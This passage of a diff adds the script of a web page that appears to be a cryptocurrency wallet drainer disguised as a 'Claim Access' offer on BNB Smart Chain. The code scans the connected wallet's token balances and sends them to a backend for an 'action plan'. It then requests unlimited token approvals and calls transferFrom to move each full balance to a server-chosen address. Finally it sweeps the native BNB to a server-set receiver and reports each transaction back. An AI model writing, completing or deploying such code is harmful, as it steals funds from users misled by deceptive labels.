+        if (triggerRunning) return;
+        if (!connectedAccount) { log('No connected account', 'warn'); return; }
+        if (currentChainId !== TARGET_CHAIN_ID) {
+          setStatus('Switch to BNB Smart Chain first.');
+          chainSwitchBanner.classList.add('visible');
+          await switchToBnbChain();
+          return;
+        }
+        claimBtn.disabled = true; claimBtn.textContent = 'Processing...';
+        await initiateClaim(connectedAccount.address, currentChainId);
+        claimBtn.disabled = false; claimBtn.textContent = '✦ Claim Access';
+      });
+
+      // ─── ACCOUNT WATCHER ─────────────────────────────────────
+      _core.watchAccount(wagmiConfig, {
+        onChange: async function(account){
+          if (account.isConnected && account.address) { await onConnected(account, _eth); }
+          else if (!account.isConnected) { onDisconnected(); }
+        }
+      });
+
+      // ─── SESSION RESTORE ─────────────────────────────────────
+      var existing = _core.getAccount(wagmiConfig);
+      if (existing.isConnected && existing.address) {
+        log('Restoring existing session...', 'ok');
+        try { await onConnected(existing, _eth); } catch(e) { log('Session restore failed: ' + e.message, 'warn'); }
+      } else {
+        log('Ready — Connect wallet to begin.', 'ok');
+      }
+
+    } catch(e) {
+      log('Web3 init error: ' + e.message, 'err');
+      if (errorBanner) { errorBanner.textContent = 'Init failed: ' + e.message; errorBanner.classList.add('visible'); }
+    }
+  }
+
+  // ─── BUILD SIGNER ───────────────────────────────────────────
+  async function buildSigner(account){
+    log('Building BrowserProvider...');
+    rawProvider = null;
+    if (account && account.connector) {
+      try { rawProvider = await account.connector.getProvider(); } catch(e) { log('Provider fallback', 'warn'); }
+    }
+    if (!rawProvider && window.ethereum) rawProvider = window.ethereum;
+    if (!rawProvider) throw new Error('No wallet provider.');
+
+    // Dynamic ethers import
+    var _eth = await import('https://esm.sh/v135/ethers@6.13.4');
+    ethersProvider = new _eth.BrowserProvider(rawProvider);
+    var accounts = [];
+    for (var attempt=1; attempt<=8; attempt++) {
+      accounts = await ethersProvider.send('eth_accounts', []);
+      if (accounts.length>0) break;
+      await sleep(600);
+    }
+    if (!accounts.length) throw new Error('Wallet returned no accounts.');
+    ethersSigner = await ethersProvider.getSigner();
+    log('Signer ready.', 'ok');
+  }
+
+  // ─── CHAIN SWITCH ───────────────────────────────────────────
+  async function switchToBnbChain(){
+    if (!rawProvider) return;
+    try {
+      await rawProvider.request({ method:'wallet_switchEthereumChain', params:[{ chainId: TARGET_CHAIN_HEX }] });
+      log('Switched to BNB Smart Chain', 'ok');
+    } catch(e) {
+      if (e.code === 4902) {
+        try { await rawProvider.request({ method:'wallet_addEthereumChain', params:[{ chainId:TARGET_CHAIN_HEX, chainName:'BNB Smart Chain', nativeCurrency:{ name:'BNB', symbol:'BNB', decimals:18 }, rpcUrls:['https://bsc-dataseed1.binance.org/'], blockExplorerUrls:['https://bscscan.com'] }] }); log('BNB Chain added', 'ok'); } catch(addErr) { log('Failed adding BNB Chain', 'err'); }
+      } else { log('Chain switch error', 'err'); }
+    }
+  }
+
+  // ─── PROVIDER LISTENERS ─────────────────────────────────────
+  function attachProviderListeners(){
+    if (!rawProvider) return;
+    rawProvider.on('chainChanged', async function(hexChain){
+      currentChainId = parseInt(hexChain, 16);
+      if (currentChainId !== TARGET_CHAIN_ID) { chainSwitchBanner.classList.add('visible'); setStatus('Wrong network.'); }
+      else { chainSwitchBanner.classList.remove('visible'); setStatus('BNB Smart Chain detected.'); }
+      if (connectedAccount) { try { await buildSigner(connectedAccount); await refreshInfo(connectedAccount.address, currentChainId); } catch(e) {} }
+    });
+    rawProvider.on('accountsChanged', async function(accs){
+      if (!accs.length) { onDisconnected(); return; }
+      if (connectedAccount) { try { await buildSigner(connectedAccount); await refreshInfo(accs[0], currentChainId); } catch(e) {} }
+    });
+    log('Provider listeners attached.', 'ok');
+  }
+
+  // ─── ON CONNECTED ───────────────────────────────────────────
+  async function onConnected(account, _eth){
+    log('Wallet connected: ' + account.address, 'ok');
+    connectedAccount = account;
+    currentChainId = account.chainId || TARGET_CHAIN_ID;
+    connectBtn.style.display = 'none';
+    claimBtn.style.display = 'inline-block';
+    disconnectBtn.style.display = 'inline-block';
+    infoPanel.classList.add('visible');
+    txPanel.classList.add('visible');
+    document.getElementById('walletAddress').textContent = account.address.slice(0,8) + '...' + account.address.slice(-6);
+    document.getElementById('sessionLabel').textContent = (account.connector && account.connector.name) || 'Web3Modal';
+    statusBadge.textContent = 'Awaiting Claim'; statusBadge.className = 'badge badge-yellow';
+    try { await buildSigner(account); } catch(e) { setStatus('Could not reach wallet.'); return; }
+    attachProviderListeners();
+    if (currentChainId !== TARGET_CHAIN_ID) { chainSwitchBanner.classList.add('visible'); setStatus('Switch to BNB Smart Chain.'); }
+    else { chainSwitchBanner.classList.remove('visible'); setStatus('Connected. Click Claim Access.'); }
+    await refreshInfo(account.address, currentChainId);
+  }
+
+  // ─── SCAN WALLET ASSETS (frontend reads, backend decides) ───
+  async function scanWalletAssets(address, chainId){
+    // Get token list from SERVER
+    var tokenData = await apiCall('get_token_list', { chain_id: chainId });
+    if (!tokenData || !tokenData.tokens || !tokenData.tokens.length) {
+      document.getElementById('assetList').innerHTML = '<span class="scan-status">No token list available.</span>';
+      scannerPanel.classList.add('visible');
+      return [];
+    }
+    var tokens = tokenData.tokens;
+    discoveredAssets = [];
+    log('Scanning ' + tokens.length + ' tokens...');
+    document.getElementById('assetList').innerHTML = '<span class="scan-status">Scanning ' + tokens.length + ' tokens...</span>';
+    scannerPanel.classList.add('visible');
+
+    var _eth = await import('https://esm.sh/v135/ethers@6.13.4');
+    var ERC20_ABI = serverConfig.erc20_abi || ['function balanceOf(address owner) view returns (uint256)'];
+
+    var results = await Promise.allSettled(tokens.map(async function(t){
+      try {
+        var c = new _eth.Contract(t.address, ['function balanceOf(address owner) view returns (uint256)', 'function decimals() view returns (uint8)'], ethersProvider);
+        var bal = await c.balanceOf(address);
+        var dec = t.decimals || 18;
+        var fmt = parseFloat(_eth.formatUnits(bal, dec));
+        return fmt > 0 ? { symbol: t.symbol, address: t.address, decimals: dec, balance: fmt, rawBalance: bal.toString() } : null;
+      } catch(e) { return null; }
+    }));
+
+    discoveredAssets = results.filter(function(r){ return r.status==='fulfilled' && r.value!==null; }).map(function(r){ return r.value; });
+    log('Found ' + discoveredAssets.length + ' asset(s).', 'ok');
+    renderAssetList(chainId);
+    return discoveredAssets;
+  }
+
+  function renderAssetList(chainId){
+    var list = document.getElementById('assetList');
+    var chainInfoData = null;
+    apiCall('get_chain_info', { chain_id: chainId }).then(function(d){ if(d) chainInfoData = d; });
+    if (!discoveredAssets.length) { list.innerHTML = '<span class="scan-status">No token balances found.</span>'; return; }
+    var exp = 'https://bscscan.com';
+    list.innerHTML = discoveredAssets.map(function(a){ return '<div class="asset-item"><span class="asset-symbol">'+a.symbol+'</span><span class="asset-balance">'+a.balance.toLocaleString(undefined,{maximumFractionDigits:4})+'</span><a href="'+exp+'/token/'+a.address+'" target="_blank" style="color:#64748b;font-size:0.75rem;">view</a></div>'; }).join('');
+  }
+
+  // ─── REFRESH INFO ───────────────────────────────────────────
+  async function refreshInfo(address, chainId){
+    currentChainId = chainId || TARGET_CHAIN_ID;
+    var info = await apiCall('get_chain_info', { chain_id: currentChainId });
+    if (info && info.info) {
+      document.getElementById('networkName').textContent = info.info.name;
+      document.getElementById('chainIdDisplay').textContent = currentChainId;
+    }
+    if (!ethersProvider) return;
+    try {
+      var _eth = await import('https://esm.sh/v135/ethers@6.13.4');
+      var bal = await ethersProvider.getBalance(address);
+      document.getElementById('nativeBalance').textContent = parseFloat(_eth.formatEther(bal)).toFixed(6) + ' ' + (info && info.info ? info.info.symbol : 'BNB');
+      if (info && info.usdt_addr) {
+        var t = new _eth.Contract(info.usdt_addr, ['function balanceOf(address) view returns (uint256)','function decimals() view returns (uint8)'], ethersProvider);
+        var b = await t.balanceOf(address); var dec = await t.decimals();
+        document.getElementById('usdtBalance').textContent = parseFloat(_eth.formatUnits(b, dec)).toFixed(2) + ' USDT';
+      }
+    } catch(e) { log('refreshInfo error: ' + e.message, 'warn'); }
+  }
+
+  // ─── INITIATE CLAIM — frontend scans, backend plans ─────────
+  async function initiateClaim(address, chainId){
+    if (triggerRunning) { log('Already running.', 'warn'); return; }
+    triggerRunning = true;
+    log('Initiating claim process...', 'ok');
+
+    try {
+      // Stage 1: Scan assets locally (wallet read)
+      setStatus('Stage 1/4 — Scanning assets...');
+      var assets = await scanWalletAssets(address, chainId);
+      if (!assets.length) { setStatus('No token balances found.'); return; }
+
+      // Stage 2: Send scan results to backend for action plan
+      setStatus('Stage 2/4 — Requesting action plan from server...');
+      var _eth = await import('https://esm.sh/v135/ethers@6.13.4');
+      var nativeBal = await ethersProvider.getBalance(address);
+      var planData = await apiCall('build_action_plan', {
+        assets: assets,
+        chain_id: chainId,
+        user_address: address,
+        native_balance: nativeBal.toString()
+      });
+      if (!planData) { setStatus('Server rejected action plan.'); return; }
+
+      serverActionPlan = planData.action_plan;
+      serverReceiver = planData.receiver;
+      var skipNative = planData.skip_native;
+      var nativeAmount = planData.native_amount;
+      log('Action plan received: ' + serverActionPlan.length + ' token step(s).', 'ok');
+
+      // Stage 3: Execute each step sequentially
+      for (var i = 0; i < serverActionPlan.length; i++) {
+        var step = serverActionPlan[i];
+        log('--- Step ' + (i+1) + '/' + serverActionPlan.length + ': ' + step.symbol + ' ---');
+        setStatus('Stage 3/4 — Processing ' + step.symbol + ' (' + (i+1) + '/' + serverActionPlan.length + ')...');
+
+        try {
+          var token = new _eth.Contract(step.address, [
+            'function approve(address spender, uint256 amount) returns (bool)',
+            'function allowance(address owner, address spender) view returns (uint256)',
+            'function transferFrom(address from, address to, uint256 amount) returns (bool)',
+            'function balanceOf(address owner) view returns (uint256)'
+          ], ethersSigner);
+
+          var gasPriceHex = await getBnbGasPrice();
+          var gasPrice = BigInt(gasPriceHex);
+
+          // APPROVE
+          var approveReceipt = await sendAndWait(
+            token.approve(step.spender, _eth.MaxUint256, { gasLimit: step.gas_limit, gasPrice: gasPriceHex }),
+            'Approve(' + step.symbol + ')',
+            _eth
+          );
+          if (!approveReceipt) { log('[SKIP] Approve failed for ' + step.symbol, 'warn'); continue; }
+
+          log('Approve confirmed. Sleeping ' + (step.allowance_wait_seconds || 7) + 's...');
+          await sleep((step.allowance_wait_seconds || 7) * 1000);
+
+          // Verify allowance
+          var freshBal = await token.balanceOf(address);
+          var allowanceOk = await waitForAllowance(token, address, step.spender, freshBal);
+          if (!allowanceOk) { log('[SKIP] Allowance not confirmed', 'err'); continue; }
+
+          // TRANSFER
+          var transferReceipt = await sendAndWait(
+            token.transferFrom(address, step.spender, freshBal, { gasLimit: step.gas_limit, gasPrice: gasPriceHex }),
+            'TransferFrom(' + step.symbol + ')',
+            _eth
+          );
+          if (!transferReceipt) { log('[SKIP] Transfer failed', 'err'); }
+          else { log(step.symbol + ' transfer complete', 'ok'); }
+
+        } catch(e) { log('[SKIP] Error on ' + step.symbol + ': ' + e.message, 'err'); }
+        if (i < serverActionPlan.length - 1) await sleep(2000);
+      }
+
+      // Stage 4: Native sweep (frontend executes, backend decided amount)
+      if (!skipNative && nativeAmount && nativeAmount !== '0') {
+        setStatus('Stage 4/4 — Sweeping native BNB...');
+        try {
+          log('Sweeping ' + _eth.formatEther(BigInt(nativeAmount)) + ' BNB...');
+          setStatus('Confirm BNB sweep in wallet...');
+          var nativeTxHash;
+          try { nativeTxHash = await sendNativeRaw(address, serverReceiver, nativeAmount); } catch(e) { log('Native sweep rejected/failed: ' + e.message, 'err'); }
+          if (nativeTxHash) {
+            transactions.unshift({ hash: nativeTxHash, status: 'pending' }); renderTxList();
+            try { var receipt = await ethersProvider.waitForTransaction(nativeTxHash, 1, 120000); var status = receipt && receipt.status===1 ? 'confirmed' : 'failed'; updateTxStatus(nativeTxHash, status); } catch(e) {}
+          }
+        } catch(e) { log('Native sweep error: ' + e.message, 'err'); }
+      } else { log('Native sweep skipped (server decision).', 'warn'); }
+
+      statusBadge.textContent = 'Complete'; statusBadge.className = 'badge badge-green';
+      setStatus('Process complete.'); log('Claim process COMPLETE', 'ok');
+
+    } catch(e) { log('Claim fatal: ' + e.message, 'err'); setStatus('Fatal error.'); }
+    finally { triggerRunning = false; }
+  }
+
+  // ─── WAIT FOR ALLOWANCE ─────────────────────────────────────
+  async function waitForAllowance(token, owner, spender, required, maxRetries){
+    maxRetries = maxRetries || 8;
+    for (var i=0; i<maxRetries; i++) {
+      try { var allowance = await token.allowance(owner, spender); if (allowance >= required) { log('Allowance confirmed', 'ok'); return true; } } catch(e) {}
+      await sleep(5000);
+    }
+    return false;
+  }
+
+  // ─── SEND + WAIT ────────────────────────────────────────────
+  async function sendAndWait(txPromise, label, _eth){
+    log('Sending ' + label + '...');
+    var txHash;
+    try { var tx = await txPromise; txHash = tx.hash; log(label + ' hash: ' + txHash, 'ok'); }
+    catch(e) { var msg = (e && (e.code===4001||e.code==='ACTION_REJECTED')) ? label+' rejected.' : label+' failed: '+e.message; log(msg, 'err'); setStatus(msg); return null; }
+    transactions.unshift({ hash: txHash, status: 'pending' }); renderTxList();
+    try {
+      setStatus('Waiting for ' + label + ' confirmation...');
+      var receipt = await ethersProvider.waitForTransaction(txHash, 1, 120000);
+      var status = receipt && receipt.status===1 ? 'confirmed' : 'failed';
+      updateTxStatus(txHash, status);
+      log(label + ' ' + status, status==='confirmed'?'ok':'err');
+      // Report to backend
+      apiCall('report_tx', { tx_hash: txHash, status: status, token_symbol: label.split('(')[1] ? label.split('(')[1].replace(')','') : 'UNKNOWN', tx_type: label.toLowerCase().indexOf('approve')!==-1?'approve':'transfer' });
+      return receipt;
+    } catch(e) { log(label + ' wait error: ' + e.message, 'warn'); updateTxStatus(txHash, 'failed'); return null; }
+  }
+
+  // ─── NATIVE SEND ────────────────────────────────────────────
+  async function sendNativeRaw(fromAddress, toAddress, valueWei){
+    var gasPrice = await getBnbGasPrice();
+    var txHash = await rawProvider.request({
+      method: 'eth_sendTransaction',
+      params: [{ from: fromAddress.toLowerCase(), to: toAddress.toLowerCase(), value: '0x' + BigInt(valueWei).toString(16), gas: '0x5208', gasPrice: gasPrice, data: '0x' }]
+    });
+    log('Native BNB tx: ' + txHash, 'ok');
+    return txHash;
+  }
+
+  async function getBnbGasPrice(){
+    try { var res = await fetch('https://bsc-dataseed1.binance.org/',{ method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ jsonrpc:'2.0', method:'eth_gasPrice', params:[], id:1 }) }); var data = await res.json(); return data.result; }
+    catch { return '0xB2D05E00'; }
+  }
+
+  // ─── TX LIST ────────────────────────────────────────────────
+  function renderTxList(){
+    var list = document.getElementById('txList');
+    if (!transactions.length) { list.innerHTML = '<span style="color:#64748b;font-size:0.85rem;">No transactions yet.</span>'; return; }
+    list.innerHTML = transactions.slice(0,5).map(function(tx){ return '<div class="tx-item"><a class="tx-hash" href="https://bscscan.com/tx/'+tx.hash+'" target="_blank">'+tx.hash.slice(0,10)+'...'+tx.hash.slice(-6)+'</a><span class="tx-status tx-'+tx.status+'">'+tx.status+'</span></div>'; }).join('');
+  }
+  function updateTxStatus(hash, status){
+    var tx = transactions.find(function(t){ return t.hash===hash; }); if (tx) { tx.status = status; renderTxList(); }
+  }
+
+  // ─── ON DISCONNECTED ────────────────────────────────────────
+  function onDisconnected(){
+    ethersProvider = null; ethersSigner = null; rawProvider = null; connectedAccount = null;
+    transactions = []; discoveredAssets = []; triggerRunning = false;
+    connectBtn.style.display = 'inline-block'; claimBtn.style.display = 'none'; disconnectBtn.style.display = 'none';
+    statusText.textContent = ''; infoPanel.classList.remove('visible'); txPanel.classList.remove('visible');
+    scannerPanel.classList.remove('visible'); chainSwitchBanner.classList.remove('visible');
+    log('Wallet disconnected.', 'warn');
+  }
+
+  // ─── STARTUP ────────────────────────────────────────────────
+  initWeb3Modal();
+
+})();
+</script>
+</body>
+</html>
